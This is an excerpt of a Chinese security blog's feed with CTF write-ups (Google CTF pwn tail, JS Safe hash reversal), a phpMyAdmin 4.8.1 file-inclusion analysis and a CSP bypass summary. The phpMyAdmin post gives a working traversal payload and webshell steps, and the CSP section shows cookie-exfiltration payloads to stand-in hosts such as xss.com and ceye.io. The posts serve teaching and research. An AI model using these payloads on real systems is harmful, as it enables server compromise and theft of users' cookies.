class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>之后执行命令，查看用户</p><img src="/2018/07/18/google-ctf-beginner-part1/21.png"><p>得到用户名，随后nc连上去，直接用该用户登录</p><img src="/2018/07/18/google-ctf-beginner-part1/22.png"><p>得到flag</p><p>这里要吐槽一点的是，这个泄露的libc一直没找到……，所以直接套用的其他人的exp。第一次感觉PWN也是蛮坑的。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;会陆陆续续的把GoogleCTF题目的相关复现整理出来，这里先放一部分。通过这次Beginner训练还是了解到了许多之前没接触过的，比如PWN题中的libc地址问题。&lt;/p&gt;
&lt;h2 id=&quot;LETTER-MISC&quot;&gt;&lt;a href=&quot;#LETTER-MISC&quot; class
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner JS Safe 1 复现</title>
    <link href="https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/"/>
    <id>https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/</id>
    <published>2018-07-08T15:58:48.000Z</published>
    <updated>2018-07-19T01:04:59.440Z</updated>
    
    <content type="html"><![CDATA[<p>周末看了看GoogleCTF的beginner题目，感觉有些题目还不错，这里就先分析其中一道题JS Safe。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/2018/07/08/google-ctf-beginner-js-safe-1/0.png"><h2 id="分析与操作"><a href="#分析与操作" class="headerlink" title="分析与操作"></a>分析与操作</h2><p>这道题有点high，作为一个JS调试新手，着实爽了一把。题目给了一个Html网页，里面有两段JS代码，看来是JS代码分析的题目。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/1.png"><p>我们先看其中的一段，前两个是解密用的参数，看到open_safe这个函数，password必须是CTF{xxxx}的格式，读取其中的数据代入判断。<br>if中把我们的输入代入了x函数。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/2.png"><p>我们的password会在env的g参数中被编码，a是读数组数据，b是创建函数，c是加操作，d是ascii码转换。</p><p>之后，根据code中的字母在env中操作属性。最后有个等待值更新的异步操作。<br>其中重点就是那个for循环对env的操作，但是代码这个又很难看懂…… 所以只能用console.log来dump出来看看细节。而我们想知道我们的password被用来干什么了。</p><p>在for循环中加上一些代码来锁定g参数的位置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="regexp">/g/</span>.test(code.substr(i,<span class="number">4</span>)))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="built_in">console</span>.log(code.substr(i,<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2018/07/08/google-ctf-beginner-js-safe-1/3.png"><p>定位在了876出现了g，然后看env里面有些啥。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/4.png"><p>有趣的东西，出现了之前js代码中的subtle，digst，sha-256，而且在最后的数组中是sha-256和我们的输入编码，这其实就可以推测这里是要对我们的输入计算sha-256hash。为了看更多细节，我们继续加入一些代码调试。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i&gt;=<span class="number">876</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + fn + <span class="string">"("</span> + arg1 + <span class="string">":"</span> +env[arg1] + <span class="string">","</span> + arg2 + <span class="string">":"</span> +env[arg2] + <span class="string">")"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + env[fn] + <span class="string">"("</span> + env[arg1] + <span class="string">","</span> + env[arg2] + <span class="string">")"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">980</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看这之间有什么操作</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/5.png"><p>果不其然，在876-884中完成了对我们输入的hash计算。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/6.png"><p>在940处，把我们计算出的hash变成数组，存入<code>env[Ѿ]</code>中。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/7.png"><p>可以很清楚的看到，在960取出了我们hash过后的第一个值，然后与230异或，异或后的值与h进行or操作后赋值给h，随后开始下一次循环。</p><p>从之前的js代码中的if就可以知道h必须为0才能跳过判断。所以异或的值必须为0，也就是说必须要和对应的值相同。这样我们就得到了一串hash计算后的数组 <code>230,104,96,84,111,24,205,187,205,134,179,94,24,181,37,191,252,103,247,114,198,80,206,223,227,255,122,0,38,250,29,238</code></p><p>最终我们把这串字符转16进制拼接得到 <code>e66860546f18cdbbcd86b35e18b525bffc67f772c650cedfe3ff7a0026fa1dee</code></p><p>这个是我们输入的字符的hash值，找个hash值破解网站，得到 Passw0rd! ，所以最终flag为<code>CTF{Passw0rd!}</code></p><p>至于剩下的代码，它是用于解密数据的，我们输入正确就会解密成功，输出是下一题的入口。感觉是一道题被拆分成了几块……</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道比较基础但是又很考察基本功的题，从中学习到了很多。</p><p>最后我想说一下的是那个SubtleCrypto.digest()方法我一开始没怎么搞懂，他是怎么把utf-8的编码数组hash计算的。之后找到了它的实现原理，所以也就懂了，为什么要一开始先utf-8编码才进行hash计算。</p><p><code>https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest</code></p><p>经过这次JS分析，感觉学习专门的JS调试迫在眉睫…… ，有变量监听和事件监听，会给调试工作带来很大便利。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BOAKGP/CTF-Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/JS%20safe</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;周末看了看GoogleCTF的beginner题目，感觉有些题目还不错，这里就先分析其中一道题JS Safe。&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;img src=&quot;
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin4.8.1 后台LFI</title>
    <link href="https://hurricane618.me/2018/07/01/phpmyadmin4-8-1-background-LFI/"/>
    <id>https://hurricane618.me/2018/07/01/phpmyadmin4-8-1-background-LFI/</id>
    <published>2018-07-01T13:02:15.000Z</published>
    <updated>2018-08-14T16:34:49.115Z</updated>
    
    <content type="html"><![CDATA[<p>之前ChaMd5团队报出来的phpmyadmin的文件包含漏洞，今天就来分析复现一下。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/1.png"><p>漏洞的输入点是 <code>include $_REQUEST[&#39;target&#39;];</code>出现了文件包含这种危险操作，那么有很大概率出现问题。</p><p>我们只要绕过57、58、59行的检测就可以成功控制包含文件。</p><p>第57行用正则匹配开头为index的路径，只要路径开头没有index即可。</p><p>第58行检索输入中是否有黑名单的字符，黑名单在第50行，可以看到 import.php和export.php，只要参数中没这两个php就行。</p><p>第59行要看Core类的方法checkPageValidity。</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/2.png"><p>第452行的第三个if判断，检查了输入中的白名单，如果有这些php就直接返回true。</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/3.png"><p>没什么用，继续看下面的操作。mb_substr截取字符串从开始的位置到?处的字符串，再次检索白名单。</p><p>虽然可以在url中加入?来通过这个判断，但是随后的include因为有?，所以就无法包含我们控制的文件。</p><p>之后，重点来了，在465行出现了一个url解码操作。由于这里解码之后又重复了一遍上面的截取操作，所以这里我们就可以让?编码两次来绕过白名单检测，之后返回到include的时候也能包含我们想要的文件。最后的payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../tongfang.txt</span><br></pre></td></tr></table></figure><p>db_sql.php是白名单中的一个，然后用两次URl编码过的?截断，两次URL编码的?在php的urldecode后会变成?，从而绕过检测，之后include文件时，服务器会认为db_sql.php%3f是一个目录，然后包含最后的文件。</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/4.png"><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ol><li>利用创建新的表，在表的字段中放入Webshell，然后包含数据库文件</li><li>执行<code>SELECT &#39;&lt;?php phpinfo(); ?&gt;&#39;</code>,然后包含php的session文件</li></ol><p>推荐用第二种方法更加隐蔽并且不需要猜测数据库文件路径，效果如下：</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/5.png"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说这个漏洞需要在登录phpmyadmin之后才能利用，所以只要密码强度够，暂时就不会有太大危险，但还是推荐尽快升级。另外如果是在session中写了Webshell，用菜刀连的时候必须要有phpmyadmin的session才行……</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=23&amp;srcid=0701Pk3Qg7hDrUSsZWD5dffq#rd" target="_blank" rel="noopener">ChaMd5的文章</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前ChaMd5团队报出来的phpmyadmin的文件包含漏洞，今天就来分析复现一下。&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;img src=&quot;/2018/07/01/
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="代码审计" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CSP绕过总结</title>
    <link href="https://hurricane618.me/2018/06/30/csp-bypass-summary/"/>
    <id>https://hurricane618.me/2018/06/30/csp-bypass-summary/</id>
    <published>2018-06-30T03:33:01.000Z</published>
    <updated>2018-08-14T16:35:26.391Z</updated>
    
    <content type="html"><![CDATA[<p>首发在信安之路上 <a href="https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ</a> ，之后文章略有修改。</p><h1 id="CSP绕过总结"><a href="#CSP绕过总结" class="headerlink" title="CSP绕过总结"></a>CSP绕过总结</h1><p>今年的0CTF预选赛6道web题，其中三道都涉及CSP的知识点，简直可怕。。。这次趁着空闲时间就稍稍总结一下CSP绕过方面的知识，无论是对以后CTF比赛还是工作都很有帮助。</p><h2 id="CSP的基础"><a href="#CSP的基础" class="headerlink" title="CSP的基础"></a>CSP的基础</h2><p>CSP的全称Content Security Policy，用来防御XSS攻击的技术。它是一种由开发者定义的安全性政策性申明，通过CSP指定可信的内容来源，让WEB处于一个安全的运行环境中。</p><p>一个CSP头由多组CSP策略组成，中间由分号分隔,如下所示：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' www.baidu.com; script-src 'unsafe-inline'</span><br></pre></td></tr></table></figure><p>其中每一组策略包含一个策略指令和一个内容源列表。策略指令有如下选项：</p><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 \&lt;audio>、\&lt;video> 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 \&lt;applet>、\&lt;embed>、\&lt;object> 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 /report-uri，提交日志</td></tr></tbody></table><p>内容源有如下选项：</p><table><thead><tr><th>源</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td></tr><tr><td>*.foo.com</td><td>允许加载foo.com子域的资源</td></tr><tr><td>abc.foo.com</td><td>只能加载这个域名下的资源</td></tr><tr><td><a href="https://a.com" target="_blank" rel="noopener">https://a.com</a></td><td>只能用HTTPS加载域名下的资源</td></tr><tr><td>https:</td><td>通过HTTPS可以加载任意域名下的资源</td></tr><tr><td>‘none’</td><td>代表空集,即不匹配任何URL,两侧单引号是必须的</td></tr><tr><td>‘self’</td><td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td></tr><tr><td>‘unsafe-inline’</td><td>允许使用内联资源,如内联的\&lt;script>元素、javascript: URL、内联的事件处理函数和内联的\&lt;style>元素,两侧单引号是必须的</td></tr><tr><td>‘unsafe-eval’</td><td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td></tr><tr><td>data:</td><td>允许data: URI作为内容来源</td></tr><tr><td>mediastream:</td><td>允许mediastream: URI作为内容来源</td></tr></tbody></table><p>内容源有三种：源列表、关键字和数据，其中<em>，</em>.foo.com，abc.foo.com，<a href="https://a.com" target="_blank" rel="noopener">https://a.com</a> ，https:属于源列表。’none’，’self’，’unsafe-inline’，’unsafe-eval’属于关键字。data:，mediastream:属于数据。</p><p>例子1</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' trustedscripts.foo.com</span><br></pre></td></tr></table></figure><p>意思就是默认的内容源必须为同源或者是 trustedscripts.foo.com</p><p>例子2</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; img-src 'self' data:; media-src mediastream:</span><br></pre></td></tr></table></figure><p>图片源可以为同源内容或者是data:引用的资源，媒体源必须使用mediastream:引用，除此以外的都执行默认内容源判断，必须为同源内容。更加详细的可以看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure><p>一个在线的CSP头部生成器可以帮助我们深入理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cspisawesome.com</span><br></pre></td></tr></table></figure><p>一个CSP安全检测网站，能够提供一些参考</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://csp-evaluator.withgoogle.com/</span><br></pre></td></tr></table></figure><h2 id="CSP的进化–nonce-script-CSP和strict-dynamic"><a href="#CSP的进化–nonce-script-CSP和strict-dynamic" class="headerlink" title="CSP的进化–nonce script CSP和strict-dynamic"></a>CSP的进化–nonce script CSP和strict-dynamic</h2><p>这是Google团队2016年在<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf" target="_blank" rel="noopener">CSP is Dead, Long live CSP</a>中正式提出的CSP种类，为了解决CSP爆出的各种各样的问题。</p><h3 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h3><p>动态生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Header(<span class="string">"Content-Security-Policy: script-src 'nonce-"</span>.$random.<span class="string">" '"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">"&lt;?php echo $random?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p><h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'strict-dynamic'</span><br></pre></td></tr></table></figure><p>SD意味着可信js生成的js代码是可信的。</p><p>这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。</p><h2 id="CSP-Bypass的方法总结"><a href="#CSP-Bypass的方法总结" class="headerlink" title="CSP Bypass的方法总结"></a>CSP Bypass的方法总结</h2><p>CSP对前端攻击的防御主要有两个：</p><ol><li>限制js的执行。</li><li>限制对不可信域的请求。</li></ol><p>接下来的多种Bypass手段也是围绕这两种的</p><h3 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h3><p>利用url跳转，回避严格的CSP。</p><p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.location=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>\&lt;a>标签配合站内的某些可控JS点击操作来跳转</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  $(#foo).click()</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"foo"</span> <span class="attr">href</span>=<span class="string">"xxxxx.com"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用网站本身的跳转接口</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://foo.com/jmp.php?url=attack.com</span><br></pre></td></tr></table></figure><h3 id="lt-link-标签预加载"><a href="#lt-link-标签预加载" class="headerlink" title="\&lt;link>标签预加载"></a>\&lt;link>标签预加载</h3><p>CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[cookie].xxx.ceye.io"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>link标签除了这两种rel，还有preconnect、prerender、subresource、preload等</p><h3 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h3><p>有些网站限制只有某些脚本才能使用，往往会使用\&lt;script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none';script-src 'nonce-abc'</span><br></pre></td></tr></table></figure><p>那么当脚本插入点为如下的情况时</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以插入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"</span></span></span><br></pre></td></tr></table></figure><p>这里利用浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用DOM-XSS"><a href="#利用DOM-XSS" class="headerlink" title="利用DOM XSS"></a>利用DOM XSS</h3><p>如果JS存在操作location.hash导致的XSS，那么这样的攻击请求不会经过后台，那么nonce后的随机值就不会刷新。可以见下面lorexxar师傅的博文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br></pre></td></tr></table></figure><p>如果有DOM操作可以插入HTML并且可以控制插入的HTML内容，那么也可以绕过CSP</p><h3 id="利用CSS-静态xss-获取nonce值"><a href="#利用CSS-静态xss-获取nonce值" class="headerlink" title="利用CSS 静态xss 获取nonce值"></a>利用CSS 静态xss 获取nonce值</h3><p>利用CSS选择器来逐字节获取信息，^=从头部判断</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="a"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=a"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="b"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=b"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="c"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=c"</span>)&#125;</span><br></pre></td></tr></table></figure><p>比如确定第一位为c，那么就会继续下面的步骤</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="ca"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=ca"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cb"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cb"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cc"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cc"</span>)&#125;</span><br></pre></td></tr></table></figure><p>由于是CSS的变化，没有引起服务器重新请求，所以nonce的值不会改变，偷取值后即可执行我们的script</p><h3 id="利用跨域传输数据"><a href="#利用跨域传输数据" class="headerlink" title="利用跨域传输数据"></a>利用跨域传输数据</h3><p>利用一些跨域传输的方法来引入JS，导致执行</p><p>具体的可以看看呆子不开口的乌云大会PPT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pan.baidu.com/s/1pLCfCWr</span><br></pre></td></tr></table></figure><p>和0CTF2018预选赛中的h4xors.club2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2018/04/10/0ctf2018-club2/</span><br></pre></td></tr></table></figure><h3 id="利用文件上传执行JS"><a href="#利用文件上传执行JS" class="headerlink" title="利用文件上传执行JS"></a>利用文件上传执行JS</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'self'</span><br></pre></td></tr></table></figure><p>针对只能加载同域下script的CSP策略，如果有上传点可以控制，那么可以在其中夹杂js代码，然后引用该文件完成执行。</p><p>可以参考前几天梅子酒师傅写的上传Wave文件绕过CSP，执行JS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw</span><br></pre></td></tr></table></figure><h3 id="base标签"><a href="#base标签" class="headerlink" title="base标签"></a>base标签</h3><p>利用base标签改变资源加载的域，从而引入恶意的js，造成js执行</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>可以看到CSP的绕过比较看重实际场景，不同的情况下有着不同的绕过方法。</p><p>作者能力有限，如果文章中有什么问题，欢迎交流。最后，恭喜RNG！</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/09/CSP%20Is%20Dead,%20Long%20Live%20CSP!%20On%20the%20Insecurity%20of%20Whitelists%20and%20the%20Future%20of%20Content%20Security%20Policy/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/10/25/csp-paper/#0x02-CSP%EF%BC%88Content-Security-Policy%EF%BC%89</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/f1de775bc43e</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/91/</span><br><span class="line"></span><br><span class="line">http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
